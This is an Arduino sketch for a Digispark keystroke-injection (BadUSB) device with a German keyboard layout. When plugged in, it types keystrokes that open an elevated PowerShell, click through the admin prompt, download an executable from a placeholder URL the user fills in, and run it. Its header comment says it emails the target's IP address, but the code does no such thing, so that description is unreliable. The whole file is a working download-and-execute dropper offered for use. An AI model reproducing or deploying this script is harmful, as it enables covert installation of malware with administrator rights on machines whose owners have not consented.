#define kbd_es_es
#include "DigiKeyboardDe.h"

//This Tool will Grap the Ip from the Target Machine and send it to your email.
//German Version

void setup (){
  int d=1000;
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboardDe.print("powershell");
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //Change "YOUR_EXE" to your Exe file
  DigiKeyboardDe.print("Invoke-WebRequest -Uri \"YOUR_EXE\" -OutFile \"Payload.exe\"");
  DigiKeyboard.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.print(".\\Payload.exe");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  
  
  
  
  }

void loop ()
{
  
  
  
}
